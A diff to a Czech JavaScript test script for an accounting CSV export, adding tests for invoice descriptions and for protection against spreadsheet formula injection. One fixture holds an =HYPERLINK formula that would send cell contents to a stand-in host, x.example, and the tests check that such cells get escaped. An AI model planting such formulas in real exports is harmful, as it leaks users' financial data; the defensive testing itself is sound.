@@ -9,7 +9,9 @@
  * jeden na TRANSAKCI, ne jeden na PÁROVÁNÍ.
  */
 
-const { sestavitRadkyExportu, vygenerovatCsvExportu } = await import('../lib/ucetni-export.ts')
+const { popisFaktury, sestavitRadkyExportu, vygenerovatCsvExportu } = await import('../lib/ucetni-export.ts')
+const { csvBunka } = await import('../lib/csv-bunka.ts')
+const { readFileSync } = await import('node:fs')
 
 let chyb = 0
 const ok = (popis, podminka) => {
@@ -42,6 +44,55 @@ const radky2 = sestavitRadkyExportu(transakce1, [
   { transakceId: 't1', fakturaId: 'FA-ZAMITNUTO', stav: 'zamitnuto' },
 ], {})
 ok('návrh bez potvrzení se neobjeví', radky2[0].faktury === '')
+
+console.log('\n== Číslo faktury a dodavatel místo id (Faktury v hlavní databázi) ==')
+const radkyPopis = sestavitRadkyExportu(
+  [{ id: 't1', datum: '2026-10-01', smer: 'vydaj', castkaHaleru: 1000, protistrana: 'X', vs: '1', kategorie: null, zdroj: 'csv_banka', branchId: null }],
+  [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }, { transakceId: 't1', fakturaId: 'f-zmizela', stav: 'potvrzeno' }],
+  {},
+  { f1: popisFaktury('FV2026/0815', 'Dodavatel s.r.o.') },
+)
+ok('popis „číslo (dodavatel)", neznámá faktura zůstane jako id', radkyPopis[0].faktury === 'FV2026/0815 (Dodavatel s.r.o.), f-zmizela')
+ok('bez čísla jen dodavatel, bez obojího věta', popisFaktury(null, 'D') === 'D' && popisFaktury('', '') === 'faktura bez čísla')
+const radkyDve = sestavitRadkyExportu(
+  [{ id: 't1', datum: '2026-10-01', smer: 'vydaj', castkaHaleru: 1000, protistrana: 'X', vs: '1', kategorie: null, zdroj: 'csv_banka', branchId: null }],
+  [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }, { transakceId: 't1', fakturaId: 'f2', stav: 'potvrzeno' },
+   { transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }],
+  {},
+  { f1: popisFaktury(null, 'Makro'), f2: popisFaktury(null, 'Makro') },
+)
+ok('dvě faktury se stejným popisem jsou v exportu dvakrát, táž faktura jednou', radkyDve[0].faktury === 'Makro, Makro')
+
+console.log('\n== Vzorec z e-mailu se v Excelu nespustí ==')
+{
+  // Buňka po odstranění uvozovek CSV — to, co Excel uvidí.
+  const bunka = (radek, index) => {
+    const m = radek.match(/("([^"]|"")*"|[^;]*)(;|$)/g).map((x) => x.replace(/;$/, ''))
+    const b = m[index] ?? ''
+    return b.startsWith('"') ? b.slice(1, -1).replace(/""/g, '"') : b
+  }
+  const zakladni = { id: 't1', datum: '2026-10-10', smer: 'vydaj', castkaHaleru: 1210000, protistrana: 'Dodavatel s.r.o.', vs: '2026101', kategorie: null, zdroj: 'csv_banka', branchId: null }
+  const radky = sestavitRadkyExportu(
+    [zakladni, { ...zakladni, id: 't2', protistrana: '+420 Útočník' }],
+    [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }],
+    {},
+    { f1: popisFaktury('=HYPERLINK("https://x.example/?"&A2&H2)', '') },
+  )
+  const csv = vygenerovatCsvExportu(radky).split('\r\n')
+  const sloupecFaktur = csv[0].split(';').findIndex((h) => /Faktur/.test(h))
+  const sloupecProtistrany = csv[0].split(';').findIndex((h) => /Protistrana/.test(h))
+  ok('hlavička: sloupce Faktura(y) a Protistrana nalezené', sloupecFaktur >= 0 && sloupecProtistrany >= 0)
+  ok('číslo faktury začínající = je v Excelu text (apostrof)', bunka(csv[1], sloupecFaktur).startsWith("'="))
+  ok('protistrana začínající + je text', bunka(csv[2], sloupecProtistrany).startsWith("'+"))
+  ok('@ i tabulátor taky', csvBunka('@SUM(1+1)').startsWith("'@") && csvBunka('\tx').startsWith("'"))
+  // Čísla zůstávají čísly, jinak by účetnímu přestaly fungovat součty.
+  ok('záporná částka (dobropis) zůstane číslem: -5.00', csvBunka('-5.00') === '-5.00' && csvBunka(-5) === '-5')
+  ok('obyčejný text beze změny', csvBunka('Makro') === 'Makro')
+  // Export faktur musí používat TUTÉŽ funkci — vlastní kopie by ochranu neměla.
+  const exportFaktur = readFileSync('app/api/faktury/export/route.ts', 'utf8')
+  ok('export faktur bere sdílenou csvBunka (bez vlastní kopie)',
+    /import \{ csvBunka \} from '@\/lib\/csv-bunka'/.test(exportFaktur) && !/function csvBunka/.test(exportFaktur))
+}
 
 console.log('\n== branchId null → středisko "Firma" ==')
 
